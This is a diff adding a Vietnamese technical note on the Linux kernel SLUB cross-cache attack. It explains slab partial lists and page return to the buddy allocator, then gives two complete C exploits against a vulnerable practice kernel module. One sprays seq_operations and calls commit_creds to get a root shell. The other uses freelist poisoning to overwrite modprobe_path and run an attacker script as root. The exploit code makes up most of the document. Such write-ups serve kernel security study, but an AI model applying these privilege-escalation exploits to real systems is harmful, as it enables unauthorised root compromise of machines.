@@ -1,0 +1,365 @@
+--- 
+title: Cross-Cache 
+date: 2025-05-18 00:00:00 +0800
+description: 'zzz'
+tags: ['pwn','kernel','note']
+authors: ['kuvee']
+draft: false
+---
+
+## concept
+
+
+- slab : chứa nhiều obj có cùng kích thước , gồm 1 hoặc nhiều page , mỗi slab chứa `objs_per_slab` 
+
+- active slab: trên mỗi CPU , SLUB giữ 1 slab đang hoạt động để allocate tiếp theo , nó không nằm trong  `partical list` . 
+
+- Per-CPU partical list : list các slab ( cache ) chưa đầy hoặc còn trống của CPU đó , mục tiêu để giữ các slab để cấp phát nhanh , không trả về buddy ngay 
+
+- cpu_partial: ngưỡng tối đa số slab được phép nằm trong `partial list` trên một CPU.
+
+nếu partical list đã đủ cpu_partical , SLUB sẽ không giữ thêm , lúc này khi có `slab` khác giải phóng ->trả về buddy . 
+
+
+
+- điều kiện để page bị trả về buddy là : 
+
+```
+slab đó không phải là slab active , `partical-list` full 
+
+tại sao không phải là per_obj_slab*cpu_partical? ví dụ: 
+
+
+objs_per_slab = 4
+
+cpu_partial = 2
+
+sẽ luôn có 1 slab là active , khi allocate 8 thì có mỗi 8 obj -> 1 active và 1 partical 
+
+
+- nhưng với trường hợp `per_obj_slab*(cpu_partical +1)` thì 1 active + 2 cpu_partical , lúc này partical đầy  , vậy ta cần thõa mãn trường hợp slab đó không active nữa là nó sẽ trả về buddy
+
+- sau đó khi ta allocate thêm 1 obj -> đặt slab làm slab active , các slab cũ -> không còn active ( thõa điều kiện 1 là slab không còn active)
+
+- tiếp theo khi ta free 1 slab không phải active , slab đó trở thành partical và được đưa vào partical list , khi làm đủ nhiều -> partical list sẽ đạt ngưỡng 
+```
+
+- tiếp theo là free có chủ đích
+
+```
+for (i = 0; i < num_spray; i += objs_per_slab) {
+    if (i % (objs_per_slab * 2) == 0) {
+        // slab chẵn: free HẾT các object trong slab này
+        for (j = i; j < i + objs_per_slab; j++) obj_free(j);
+    } else {
+        // slab lẻ: chỉ free 1 object (làm slab thành "partial")
+        obj_free(i);
+    }
+}
+```
+
+- khi partical đã đầy , bất kỳ slab không active nào bị free sạch sẽ không còn chỗ để giữ lại trong partical list nữa -> slub trả nguyên page order-0 về buddy và đó chính là các slab chẵn trong vòng lặp
+
+
+- nếu ta free hết 2 slab liền kề nhau , `buddy allocator` có thể gộp 2 trang order-0 thành order-1 , làm nó khó tái chiếm hơn -> free xen kẻ giữa slab chẵn và lẻ ( 1 thằng trả về buddy 1 thằng giữ ở partical) 
+
+![image](https://hackmd.io/_uploads/SyKFP3E6ge.png)
+
+- tiếp theo chỉ việc spray obj ở cache khác ( tty_operation , seq_operations) , do buddy chứa sẵn nhiều page order-0 mới trả về , khả năng cao cache kia sẽ nhận đúng các trang đó 
+
+![image](https://hackmd.io/_uploads/rJRHO34Tgl.png)
+
+
+ref : https://sam4k.com/linternals-memory-allocators-part-1/  , https://sam4k.com/linternals-memory-allocators-0x02/ , https://r1ru.github.io/posts/1/
+
+
+
+## Exploit 
+
+- ta có thể check các thông tin về slab ở `/proc/slabinfo` 
+
+```
+~ # cat /proc/slabinfo
+slabinfo - version: 2.1
+# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
+obj                    0      0    512    8    1 : tunables    0    0    0 : slabdata      0      0      0
+```
+
+- và `cpu_partical` : 
+
+```
+~ # cat /sys/kernel/slab/obj/cpu_partial
+52
+```
+
+- nhìn qua thì kiểu attack này cần hiểu rõ về cách hoạt động của `slab-allocator` , khi hiểu rõ thì việc khai thác sẽ dễ dàng hơn nhiều  
+
+exp: 
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define CMD_ALLOC 0xf000
+#define CMD_WRITE 0xf001
+#define CMD_FREE 0xf002
+#define OBJ_SIZE 0x200
+#define SPRAY_NUM 0x20
+
+uint64_t commit_cred_addr = 0xffffffff8109f980;
+uint64_t init_cred = 0xffffffff81e3cbc0;
+uint64_t kbase = 0xffffffff81000000;
+
+int fd_spray[SPRAY_NUM];
+
+uint64_t user_cs, user_ss, user_rsp, user_rflags;
+
+void spray_seq_operation() {
+  for (int i = 0; i < SPRAY_NUM; i++) {
+    fd_spray[i] = open("/proc/self/stat", O_RDONLY);
+    assert(fd_spray[i] >= 0);
+  }
+}
+
+typedef struct {
+  int id;
+  size_t size;
+  char *data;
+} request_t;
+
+struct obj {
+  char buf[OBJ_SIZE];
+};
+
+int fd;
+int cmd_alloc(int id) {
+  request_t req = {.id = id};
+  return ioctl(fd, CMD_ALLOC, &req);
+}
+
+int cmd_free(int id) {
+  request_t req = {.id = id};
+  return ioctl(fd, CMD_FREE, &req);
+}
+
+int cmd_write(int id, size_t size, char *data) {
+  request_t req = {.id = id, .size = size, .data = data};
+  return ioctl(fd, CMD_WRITE, &req);
+}
+
+void win_func() {
+  if (getuid() == 0) {
+    puts("[*] i'm root right now");
+    execl("/bin/sh", "-sh", 0);
+  } else {
+    puts("no luck!!");
+  }
+}
+
+void save_state() {
+  asm volatile(".intel_syntax noprefix;"
+               "mov user_cs,cs;"
+               "mov user_ss,ss;"
+               "mov user_rsp,rsp;"
+               "pushf;"
+               "pop user_rflags;"
+               ".att_syntax;");
+  puts("[+] save_state successful");
+}
+
+void restore_state() {
+  asm volatile(".intel_syntax noprefix;"
+               "swapgs;"
+               "mov [rsp],%0;"
+               "mov [rsp+8],%1;"
+               "mov [rsp+0x10],%2;"
+               "mov [rsp+0x18],%3;"
+               "mov [rsp+0x20],%4;"
+               "iretq;"
+               ".att_syntax"
+               :
+               : "r"(win_func), "r"(user_cs), "r"(user_rflags), "r"(user_rsp),
+                 "r"(user_ss));
+}
+
+void priveleged() {
+  void (*commit_cred)(void *) = (void *)commit_cred_addr;
+  commit_cred((void *)init_cred);
+  restore_state();
+}
+
+int main(int argc, char **argv) {
+  save_state();
+  int obj_per_slab = 8;
+  int cpu_partical = 52;
+  int number_spray = obj_per_slab * (cpu_partical + 1);
+  fd = open("/dev/vuln", O_RDWR);
+  if (fd < 0) {
+    puts("open failed");
+    exit(-1);
+  }
+  for (int i = 0; i < number_spray; i++) {
+    cmd_alloc(i);
+  }
+  cmd_alloc(number_spray); // active slab
+  for (int i = 0; i < number_spray; i += obj_per_slab) {
+    if (i % (obj_per_slab * 2) == 0) {
+      for (int j = i; j < i + obj_per_slab; j++) {
+        cmd_free(j);
+      }
+    } else {
+      cmd_free(i);
+    }
+  }
+  spray_seq_operation();
+  char pl[8];
+  *(uint64_t *)pl = (uint64_t)priveleged;
+
+  for (int i = 0; i < number_spray; i += obj_per_slab) {
+    if (i % (obj_per_slab * 2) == 0) {
+      cmd_write(i, 8, pl);
+    }
+  }
+  for (int i = 0; i < SPRAY_NUM; i++) {
+    read(fd_spray[i], pl, 1);
+  }
+
+  return 0;
+}
+
+```
+
+- TL;DR
+
+```
+- Spraying `obj_per_slab * (cpu_partical+1)` 
+- Allocate thêm 1 obj để slab đó là active -> các slab vừa spray thành non-active ( điều kiện cần để trả về cho buddy ) 
+- free các slab xen kẻ để tránh việc buddy gộp các page liền kề với nhau thành order lớn hơn
+- spray các obj cần trigger 
+```
+
+- ngoài ra vì  `CONFIG_SLAB_FREELIST_HARDENED`  không được bật ở bài này -> ta có thể overwrite -> có thể dùng `free-list poisioning` để overwriting `modprobe_path` : 
+
+```c
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define CMD_ALLOC 0xf000
+#define CMD_WRITE 0xf001
+#define CMD_FREE 0xf002
+#define OBJ_SIZE 0x200
+
+uint64_t kbase = 0xffffffff81000000;
+typedef struct {
+  int id;
+  size_t size;
+  char *data;
+} request_t;
+
+struct obj {
+  char buf[OBJ_SIZE];
+};
+
+typedef unsigned short __u16;
+typedef unsigned char __u8;
+typedef unsigned int __u32;
+
+struct sockaddr_alg {
+  __u16 salg_family;
+  __u8 salg_type[14];
+  __u32 salg_feat;
+  __u32 salg_mask;
+  __u8 salg_name[64];
+};
+
+int fd;
+int cmd_alloc(int id) {
+  request_t req = {.id = id};
+  return ioctl(fd, CMD_ALLOC, &req);
+}
+
+int cmd_free(int id) {
+  request_t req = {.id = id};
+  return ioctl(fd, CMD_FREE, &req);
+}
+
+int cmd_write(int id, size_t size, char *data) {
+  request_t req = {.id = id, .size = size, .data = data};
+  return ioctl(fd, CMD_WRITE, &req);
+}
+
+int main(int argc, char **argv) {
+  struct sockaddr_alg sa;
+  if (argc == 2) {
+    printf("uid = %d\n", getuid());
+    setuid(0);
+    setuid(0);
+    system("/bin/sh");
+    return 0;
+  }
+  fd = open("/dev/vuln", O_RDWR);
+  if (fd < 0) {
+    puts("open failed");
+    exit(-1);
+  }
+  cmd_alloc(0);
+  cmd_free(0);
+  uint64_t obj = 0xffffffffc0002660;
+  printf("obj at: 0x%lx\n", obj);
+  char *ptr = malloc(0x200);
+  uint64_t *ptr1 = (uint64_t *)ptr + 32;
+  *ptr1 = obj;
+  cmd_write(0, 0x200, ptr);
+  cmd_alloc(1);
+  cmd_alloc(2);
+  memset(ptr, 0, 0x200);
+  uint64_t modprobe_path = 0xffffffff81eafcc0;
+  *((uint64_t *)ptr) = modprobe_path;
+  cmd_write(2, 0x200, ptr);
+  puts("[*] Overwrite modprobe_path");
+  memset(ptr, 0, 0x200);
+  *((uint64_t *)ptr) = *(uint64_t *)"/tmp/ku\0";
+  cmd_write(0, 8, ptr);
+  puts("[+] trigger modprobe_path\n");
+
+  system("echo '#!/bin/sh\nchmod 777 /dev/sdb\ntouch /a' > /tmp/ku");
+  system("chmod 777 /tmp/ku");
+
+  int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+  if (alg_fd < 0) {
+    perror("socket(AF_ALG) failed");
+    return 1;
+  }
+  memset(&sa, 0, sizeof(sa));
+  sa.salg_family = AF_ALG;
+  strcpy((char *)sa.salg_type, "kuvee"); // dummy string
+  bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
+
+  return 0;
+}
+
+```
+
+
+ref: 
+
+- https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/ 
+- https://lore.kernel.org/lkml/20210505200610.13943-3-longman@redhat.com/
+- https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary
+- https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf
+
